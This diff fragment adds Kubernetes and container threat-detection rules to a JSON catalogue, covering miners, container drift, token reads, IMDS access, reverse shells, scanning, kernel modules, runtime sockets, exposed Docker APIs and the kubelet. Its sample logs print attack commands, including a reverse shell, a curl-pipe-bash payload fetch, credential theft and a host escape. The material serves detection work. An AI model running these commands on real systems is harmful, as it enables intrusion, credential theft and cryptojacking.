+    ],
+    "description": "Execution of known miners (xmrig, cpuminer, t-rex), Stratum protocol connections (stratum+tcp, ports 3333/4444/5555/14444), DNS lookups to mining pools, or sustained CPU at limit from a new image.",
+    "detection": "source=falco rule IN (\"Detect crypto miners using the Stratum protocol\",\"Detect outbound connections to common miner pool ports\") OR (source=coredns query IN (\"*.minexmr.com\",\"*.nanopool.org\",\"*.supportxmr.com\",\"*.2miners.com\",\"*.hashvault.pro\")) OR (proc.name IN (xmrig,cpuminer,minerd))",
+    "falsePositives": "Very low — legitimate mining workloads are almost never permitted in corporate clusters.",
+    "sampleLog": {
+      "time": "2026-10-02T22:35:41.006218Z",
+      "rule": "Detect crypto miners using the Stratum protocol",
+      "priority": "Critical",
+      "source": "syscall",
+      "output": "Possible miner running (command=./agent -o stratum+tcp://pool.supportxmr.com:3333 -u 44Ab...x9 --cpu-max-threads-hint=90 pid=4182 container=c71a0b3f9e22 image=docker.io/metricsx/agent:2.1)",
+      "output_fields": {
+        "container.id": "c71a0b3f9e22",
+        "container.image.repository": "docker.io/metricsx/agent",
+        "k8s.ns.name": "monitoring",
+        "k8s.pod.name": "node-metrics-agent-7xk2p",
+        "proc.cmdline": "./agent -o stratum+tcp://pool.supportxmr.com:3333 -u 44Ab...x9 --cpu-max-threads-hint=90",
+        "proc.name": "agent"
+      },
+      "hostname": "worker-node-04",
+      "tags": [
+        "container",
+        "maturity_stable",
+        "mitre_impact",
+        "T1496"
+      ]
+    }
+  },
+  {
+    "id": "KSU-031",
+    "name": "Container Drift – New Binary Dropped and Executed",
+    "category": "Container Runtime",
+    "severity": "High",
+    "confidence": 76,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "EDR / Linux auditd"
+    ],
+    "tactics": [
+      "Command and Control",
+      "Execution"
+    ],
+    "mitre": [
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer"
+      },
+      {
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell"
+      }
+    ],
+    "description": "An executable that was not part of the original image is written to the container filesystem and executed (immutable-container drift), or a package manager (apt, yum, apk, pip) runs in a running container to install tooling.",
+    "detection": "source=falco rule IN (\"Drop and execute new binary in container\",\"Launch Package Management Process in Container\") OR (container.id!=host AND evt.type=execve AND proc.is_exe_upper_layer=true)",
+    "falsePositives": "Images that self-update or JIT-compile into writable layers; dev namespaces installing debugging tools.",
+    "sampleLog": {
+      "time": "2026-10-02T14:22:58.441093Z",
+      "rule": "Drop and execute new binary in container",
+      "priority": "Critical",
+      "source": "syscall",
+      "output": "Executing binary not part of base image (proc_exe=/tmp/.x/kdevtmpfsi proc_sname=sh gparent=java user=app container_id=8f3c2e1a9b7d image=registry.corp.example/payments/api exe_flags=EXE_UPPER_LAYER)",
+      "output_fields": {
+        "container.id": "8f3c2e1a9b7d",
+        "container.image.repository": "registry.corp.example/payments/api",
+        "k8s.ns.name": "payments",
+        "k8s.pod.name": "payments-api-6c9f7d8b5-qv7lm",
+        "proc.exepath": "/tmp/.x/kdevtmpfsi",
+        "proc.pname": "sh",
+        "proc.aname[2]": "java",
+        "proc.is_exe_upper_layer": true
+      },
+      "hostname": "worker-node-02",
+      "tags": [
+        "container",
+        "maturity_stable",
+        "mitre_persistence",
+        "TA0003",
+        "PCI_DSS_11.5.1"
+      ]
+    }
+  },
+  {
+    "id": "KSU-032",
+    "name": "Service Account Token or Sensitive File Read by Unexpected Process",
+    "category": "Container Runtime",
+    "severity": "High",
+    "confidence": 74,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "EDR / Linux auditd"
+    ],
+    "tactics": [
+      "Credential Access"
+    ],
+    "mitre": [
+      {
+        "id": "T1552.001",
+        "name": "Unsecured Credentials: Credentials In Files"
+      },
+      {
+        "id": "T1528",
+        "name": "Steal Application Access Token"
+      }
+    ],
+    "description": "A shell, cat, curl or other non-application process reads /var/run/secrets/kubernetes.io/serviceaccount/token, /etc/shadow, kubeconfig files, or cloud credential files inside a container.",
+    "detection": "source=falco rule IN (\"Read sensitive file untrusted\",\"Read sensitive file trusted after startup\") OR (container.id!=host AND evt.type IN (open,openat) AND fd.name IN (\"/var/run/secrets/kubernetes.io/serviceaccount/token\",\"/etc/shadow\",\"/root/.kube/config\",\"/root/.aws/credentials\") AND proc.name IN (cat,sh,bash,curl,python,base64,head,tail))",
+    "falsePositives": "Client libraries legitimately reading the SA token (exclude the main application binary).",
+    "sampleLog": {
+      "time": "2026-10-02T14:23:30.903712Z",
+      "rule": "Read sensitive file untrusted",
+      "priority": "Warning",
+      "source": "syscall",
+      "output": "Sensitive file opened for reading by non-trusted program (file=/var/run/secrets/kubernetes.io/serviceaccount/token gparent=java ggparent=containerd-shim evt_type=openat user=app process=cat command=cat /var/run/secrets/kubernetes.io/serviceaccount/token container_id=8f3c2e1a9b7d)",
+      "output_fields": {
+        "container.id": "8f3c2e1a9b7d",
+        "fd.name": "/var/run/secrets/kubernetes.io/serviceaccount/token",
+        "k8s.ns.name": "payments",
+        "k8s.pod.name": "payments-api-6c9f7d8b5-qv7lm",
+        "proc.cmdline": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+        "proc.pname": "sh"
+      },
+      "hostname": "worker-node-02",
+      "tags": [
+        "container",
+        "filesystem",
+        "mitre_credential_access",
+        "T1552.001"
+      ]
+    }
+  },
+  {
+    "id": "KSU-033",
+    "name": "Cloud Instance Metadata (IMDS) Accessed from Pod",
+    "category": "Container Runtime",
+    "severity": "High",
+    "confidence": 80,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "CNI Flow Logs (Cilium Hubble / Calico)"
+    ],
+    "tactics": [
+      "Credential Access"
+    ],
+    "mitre": [
+      {
+        "id": "T1552.005",
+        "name": "Unsecured Credentials: Cloud Instance Metadata API"
+      }
+    ],
+    "description": "A non-system pod connects to 169.254.169.254 / metadata.google.internal / 169.254.170.2 to retrieve node IAM role credentials — common SSRF and post-exploitation pivot from container to cloud account.",
+    "detection": "source=falco rule IN (\"Contact EC2 Instance Metadata Service From Container\",\"Contact cloud metadata service from container\") OR (source=flow dst_ip=\"169.254.169.254\" src_namespace NOT IN (\"kube-system\") verdict=\"FORWARDED\")",
+    "falsePositives": "Workloads without IRSA / Workload Identity that still rely on node credentials; cloud SDK region discovery.",
+    "sampleLog": {
+      "time": "2026-10-02T14:24:11.215560Z",
+      "rule": "Contact EC2 Instance Metadata Service From Container",
+      "priority": "Notice",
+      "source": "syscall",
+      "output": "Outbound connection to EC2 instance metadata service (command=curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role connection=10.244.2.53:49822->169.254.169.254:80 container_id=8f3c2e1a9b7d image=registry.corp.example/payments/api)",
+      "output_fields": {
+        "container.id": "8f3c2e1a9b7d",
+        "fd.name": "10.244.2.53:49822->169.254.169.254:80",
+        "k8s.ns.name": "payments",
+        "k8s.pod.name": "payments-api-6c9f7d8b5-qv7lm",
+        "proc.cmdline": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role"
+      },
+      "hostname": "worker-node-02",
+      "tags": [
+        "aws",
+        "container",
+        "network",
+        "mitre_credential_access",
+        "T1552.005"
+      ]
+    }
+  },
+  {
+    "id": "KSU-034",
+    "name": "Reverse Shell from Container",
+    "category": "Container Runtime",
+    "severity": "Critical",
+    "confidence": 90,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "EDR / Linux auditd",
+      "CNI Flow Logs (Cilium Hubble / Calico)"
+    ],
+    "tactics": [
+      "Execution",
+      "Command and Control"
+    ],
+    "mitre": [
+      {
+        "id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell"
+      },
+      {
+        "id": "T1095",
+        "name": "Non-Application Layer Protocol"
+      }
+    ],
+    "description": "A shell process has its stdin/stdout redirected to a network socket (bash -i >& /dev/tcp/…, nc -e, socat exec, python pty spawn) — an interactive attacker channel out of the cluster.",
+    "detection": "source=falco rule IN (\"Redirect STDOUT/STDIN to Network Connection in Container\",\"Netcat Remote Code Execution in Container\") OR (evt.type=dup2 AND fd.type IN (ipv4,ipv6) AND proc.name IN (sh,bash,python,perl,socat) AND container.id!=host)",
+    "falsePositives": "Extremely rare in production workloads.",
+    "sampleLog": {
+      "time": "2026-10-02T14:22:41.660087Z",
+      "rule": "Redirect STDOUT/STDIN to Network Connection in Container",
+      "priority": "Critical",
+      "source": "syscall",
+      "output": "Redirect stdout/stdin to network connection (gparent=java ggparent=containerd-shim fd.sip=198.51.100.66 connection=10.244.2.53:41620->198.51.100.66:4444 lport=41620 rport=4444 fd_type=ipv4 fd_proto=tcp evt_type=dup2 user=app process=bash command=bash -i container_id=8f3c2e1a9b7d)",
+      "output_fields": {
+        "container.id": "8f3c2e1a9b7d",
+        "fd.name": "10.244.2.53:41620->198.51.100.66:4444",
+        "k8s.ns.name": "payments",
+        "k8s.pod.name": "payments-api-6c9f7d8b5-qv7lm",
+        "proc.cmdline": "bash -i",
+        "proc.aname[2]": "java"
+      },
+      "hostname": "worker-node-02",
+      "tags": [
+        "container",
+        "maturity_stable",
+        "mitre_execution",
+        "network",
+        "process",
+        "T1059"
+      ]
+    }
+  },
+  {
+    "id": "KSU-035",
+    "name": "Network Scanning Tool Executed in Container",
+    "category": "Container Runtime",
+    "severity": "Medium",
+    "confidence": 80,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "CNI Flow Logs (Cilium Hubble / Calico)"
+    ],
+    "tactics": [
+      "Discovery"
+    ],
+    "mitre": [
+      {
+        "id": "T1046",
+        "name": "Network Service Discovery"
+      },
+      {
+        "id": "T1613",
+        "name": "Container and Resource Discovery"
+      }
+    ],
+    "description": "nmap, masscan, zmap, kube-hunter or similar tools executed in a container, or a pod contacting a large number of distinct IP:port pairs (east-west scan of services, kubelet 10250, etcd 2379).",
+    "detection": "(source=falco evt.type=execve proc.name IN (nmap,masscan,zmap,kube-hunter,peirates,netexec)) OR (source=flow | stats dc(dst_ip) AS hosts, dc(dst_port) AS ports BY src_pod span=1m | where hosts > 50 OR ports > 100)",
+    "falsePositives": "Authorised vulnerability scanners running in-cluster (allow-list their namespace).",
+    "sampleLog": {
+      "time": "2026-10-02T14:25:02.330911Z",
+      "rule": "Network Discovery Tool Launched in Container",
+      "priority": "Warning",
+      "source": "syscall",
+      "output": "Network discovery tool executed (proc.cmdline=nmap -sT -Pn -p 2379,6443,10250,10255 10.0.1.0/24 user=root container_id=8f3c2e1a9b7d k8s_ns=payments)",
+      "output_fields": {
+        "container.id": "8f3c2e1a9b7d",
+        "k8s.ns.name": "payments",
+        "k8s.pod.name": "payments-api-6c9f7d8b5-qv7lm",
+        "proc.cmdline": "nmap -sT -Pn -p 2379,6443,10250,10255 10.0.1.0/24",
+        "proc.name": "nmap"
+      },
+      "hostname": "worker-node-02",
+      "tags": [
+        "container",
+        "network",
+        "mitre_discovery",
+        "T1046"
+      ]
+    }
+  },
+  {
+    "id": "KSU-036",
+    "name": "Kernel Module Loaded from Container",
+    "category": "Container Runtime",
+    "severity": "Critical",
+    "confidence": 88,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "EDR / Linux auditd"
+    ],
+    "tactics": [
+      "Persistence",
+      "Privilege Escalation"
+    ],
+    "mitre": [
+      {
+        "id": "T1547.006",
+        "name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions"
+      },
+      {
+        "id": "T1611",
+        "name": "Escape to Host"
+      }
+    ],
+    "description": "init_module / finit_module syscall, insmod or modprobe executed from inside a container (requires CAP_SYS_MODULE). Loading a kernel module from a container compromises the node kernel — typical of rootkits (e.g. Diamorphine).",
+    "detection": "source=falco rule=\"Linux Kernel Module Injection Detected\" OR (evt.type IN (init_module,finit_module) AND container.id!=host) OR (source=auditd syscall IN (init_module,finit_module) AND cgroup LIKE \"*kubepods*\")",
+    "falsePositives": "GPU/storage driver installer DaemonSets (NVIDIA, Portworx) — allow-list by image digest.",
+    "sampleLog": "type=SYSCALL msg=audit(1790933011.552:88231): arch=c000003e syscall=313 success=yes exit=0 a0=3 a1=55d0c6a1b2c0 a2=0 a3=0 items=0 ppid=51882 pid=51907 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=4294967295 comm=\"insmod\" exe=\"/usr/sbin/insmod\" subj=unconfined key=\"kernel_modules\"\n{\"time\":\"2026-10-02T09:23:31.552003Z\",\"rule\":\"Linux Kernel Module Injection Detected\",\"priority\":\"Warning\",\"output\":\"Linux Kernel Module injection from container (parent_exepath=/bin/sh gparent=containerd-shim module=diamorphine.ko res=0 evt_type=finit_module user=root process=insmod container_id=2b9d1e7c4a6f)\",\"hostname\":\"worker-node-03\"}"
+  },
+  {
+    "id": "KSU-037",
+    "name": "Container Runtime Socket Accessed from Container",
+    "category": "Container Engine & Node",
+    "severity": "Critical",
+    "confidence": 88,
+    "logSources": [
+      "Falco (Runtime Security)",
+      "Docker Daemon Logs / Events",
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Privilege Escalation",
+      "Execution"
+    ],
+    "mitre": [
+      {
+        "id": "T1611",
+        "name": "Escape to Host"
+      },
+      {
+        "id": "T1610",
+        "name": "Deploy Container"
+      }
+    ],
+    "description": "A process inside a container connects to /var/run/docker.sock, /run/containerd/containerd.sock or /var/run/crio/crio.sock. Access to the runtime socket allows launching a privileged container on the host, equivalent to node root.",
+    "detection": "(source=falco evt.type=connect AND fd.name IN (\"/var/run/docker.sock\",\"/run/containerd/containerd.sock\",\"/var/run/crio/crio.sock\") AND container.id!=host) OR (source=docker action=create Actor.Attributes.privileged=true initiated_from_container=true)",
+    "falsePositives": "CI runners using Docker-in-Docker, monitoring agents (cAdvisor, Datadog) — prefer rootless builders (Kaniko, BuildKit).",
+    "sampleLog": {
+      "time": "2026-10-02T13:10:44.090515Z",
+      "rule": "Container Runtime Socket Connection From Container",
+      "priority": "Critical",
+      "source": "syscall",
+      "output": "Container connected to container runtime socket (fd.name=/host/var/run/docker.sock proc.cmdline=docker -H unix:///host/var/run/docker.sock run --privileged --pid=host -v /:/mnt alpine chroot /mnt sh container_id=6e2a8c4b1d9f k8s_pod=node-shell)",
+      "output_fields": {
+        "container.id": "6e2a8c4b1d9f",
+        "fd.name": "/host/var/run/docker.sock",
+        "k8s.ns.name": "web",
+        "k8s.pod.name": "node-shell",
+        "proc.cmdline": "docker -H unix:///host/var/run/docker.sock run --privileged --pid=host -v /:/mnt alpine chroot /mnt sh"
+      },
+      "hostname": "worker-node-01",
+      "tags": [
+        "container",
+        "docker",
+        "mitre_privilege_escalation",
+        "T1611"
+      ]
+    }
+  },
+  {
+    "id": "KSU-038",
+    "name": "Exposed Docker Remote API Used to Create or Build Containers",
+    "category": "Container Engine & Node",
+    "severity": "Critical",
+    "confidence": 90,
+    "logSources": [
+      "Docker Daemon Logs / Events",
+      "Host Firewall / VPC Flow Logs"
+    ],
+    "tactics": [
+      "Initial Access",
+      "Execution",
+      "Defense Evasion"
+    ],
+    "mitre": [
+      {
+        "id": "T1133",
+        "name": "External Remote Services"
+      },
+      {
+        "id": "T1610",
+        "name": "Deploy Container"
+      },
+      {
+        "id": "T1612",
+        "name": "Build Image on Host"
+      }
+    ],
+    "description": "The Docker Engine API on TCP 2375/2376 receives container create, exec or image build calls from an external or non-management IP. Unauthenticated Docker APIs are mass-exploited for cryptomining (TeamTNT, Kinsing) and attackers build images directly on the host to evade registry scanning.",
+    "detection": "(source=dockerd msg=\"API listen on *:2375\") OR (source=dockerd msg IN (\"Calling POST */containers/create\",\"Calling POST */build\",\"Calling POST */exec\") remote_addr NOT IN (mgmt_cidrs)) OR (source=flow dst_port IN (2375,2376) direction=inbound src_ip NOT IN (mgmt_cidrs))",
+    "falsePositives": "Legacy build hosts with remote Docker access from CI (should use TLS client certs and allow-lists).",
+    "sampleLog": "time=\"2026-10-02T03:10:02.118923Z\" level=warning msg=\"Binding to IP address without --tlsverify is insecure and gives root access on this machine to everyone who has access to your network.\" host=\"tcp://0.0.0.0:2375\"\ntime=\"2026-10-02T03:14:31.552004Z\" level=debug msg=\"Calling POST /v1.43/containers/create?name=kworkerds\" remote_addr=\"198.51.100.23:51522\"\ntime=\"2026-10-02T03:14:31.601277Z\" level=debug msg=\"form data: {\\\"Image\\\":\\\"alpine\\\",\\\"Cmd\\\":[\\\"chroot\\\",\\\"/mnt\\\",\\\"sh\\\",\\\"-c\\\",\\\"curl -s http://198.51.100.66/k.sh|bash\\\"],\\\"HostConfig\\\":{\\\"Binds\\\":[\\\"/:/mnt\\\"],\\\"Privileged\\\":true,\\\"NetworkMode\\\":\\\"host\\\"}}\"\ntime=\"2026-10-02T03:15:09.004118Z\" level=debug msg=\"Calling POST /v1.43/build?t=local%2Fsvc%3A1&dockerfile=Dockerfile\" remote_addr=\"198.51.100.23:51540\""
+  },
+  {
+    "id": "KSU-039",
+    "name": "Static Pod Manifest or Kubelet Config Tampered on Node",
+    "category": "Container Engine & Node",
+    "severity": "Critical",
+    "confidence": 86,
+    "logSources": [
+      "EDR / Linux auditd",
+      "File Integrity Monitoring",
+      "Kubelet Logs"
+    ],
+    "tactics": [
+      "Persistence",
+      "Privilege Escalation",
+      "Defense Evasion"
+    ],
+    "mitre": [
+      {
+        "id": "T1543.005",
+        "name": "Create or Modify System Process: Container Service"
+      },
+      {
+        "id": "T1562.001",
+        "name": "Impair Defenses: Disable or Modify Tools"
+      }
+    ],
+    "description": "Files created or modified in /etc/kubernetes/manifests (static pods), /var/lib/kubelet/config.yaml, kubelet systemd drop-ins, or /etc/containerd/config.toml. Static pods are started by kubelet directly, bypass admission control, and survive API-level clean-up; config changes can enable anonymous auth or disable authorization.",
+    "detection": "source=auditd key IN (\"k8s_manifests\",\"kubelet_config\") syscall IN (openat,rename,unlink) success=yes exe NOT IN (\"/usr/bin/kubeadm\",\"/usr/bin/kubelet\") OR (source=kubelet msg=\"*Static pod*\" AND file NOT IN (baseline_manifests))",
+    "falsePositives": "kubeadm upgrades, configuration management (Ansible, Chef) runs during maintenance windows.",
+    "sampleLog": "type=SYSCALL msg=audit(1790930520.338:77140): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd3a6c2e10 a2=241 a3=1b6 items=2 ppid=48810 pid=48851 auid=1001 uid=0 gid=0 euid=0 tty=pts1 ses=12 comm=\"cp\" exe=\"/usr/bin/cp\" key=\"k8s_manifests\"\ntype=PATH msg=audit(1790930520.338:77140): item=1 name=\"/etc/kubernetes/manifests/kube-apiserver-proxy.yaml\" inode=1835128 dev=103:01 mode=0100644 ouid=0 ogid=0 nametype=CREATE\nI1002 08:42:03.117205    1187 kubelet.go:2425] \"SyncLoop ADD\" source=\"file\" pods=[\"kube-system/kube-apiserver-proxy-cp-node-01\"]"
+  },
+  {
+    "id": "KSU-040",
+    "name": "Unauthenticated or Anomalous Kubelet API Access (10250)",
+    "category": "Container Engine & Node",
+    "severity": "Critical",
+    "confidence": 85,
+    "logSources": [
+      "Kubelet Logs",
+      "Host Firewall / VPC Flow Logs",
+      "Kubernetes Audit Log"
+    ],
+    "tactics": [
+      "Execution",
+      "Initial Access"
+    ],
+    "mitre": [
+      {
+        "id": "T1609",
+        "name": "Container Administration Command"
+      },
+      {
+        "id": "T1133",
+        "name": "External Remote Services"
+      }
+    ],
+    "description": "Requests to the kubelet API (/run, /exec, /pods, /runningpods, /configz) on 10250/10255 from sources other than the API server or metrics-server, or kubelet authz checks (subjectaccessreviews by system:node) for unexpected users. Allows command execution in any pod on the node without touching the API server audit log.",
+    "detection": "(source=kubelet URI IN (\"/run/*\",\"/exec/*\",\"/runningpods/*\",\"/pods\",\"/configz\") srcIP NOT IN (apiserver_ips, metrics_server_ips)) OR (source=flow dst_port IN (10250,10255) src_ip NOT IN (apiserver_ips, metrics_server_ips, monitoring_cidrs))",
+    "falsePositives": "Prometheus scraping /metrics, metrics-server, kubectl logs/exec proxied via the API server.",
+    "sampleLog": "I1002 03:20:41.551906    2214 httplog.go:134] \"HTTP\" verb=\"POST\" URI=\"/run/kube-system/kube-proxy-9wz7d/kube-proxy\" latency=\"212.334ms\" userAgent=\"curl/8.5.0\" audit-ID=\"\" srcIP=\"198.51.100.23:51990\" resp=200\nI1002 03:20:44.008712    2214 httplog.go:134] \"HTTP\" verb=\"GET\" URI=\"/runningpods/\" latency=\"18.207ms\" userAgent=\"curl/8.5.0\" audit-ID=\"\" srcIP=\"198.51.100.23:51994\" resp=200"
+  }
+]
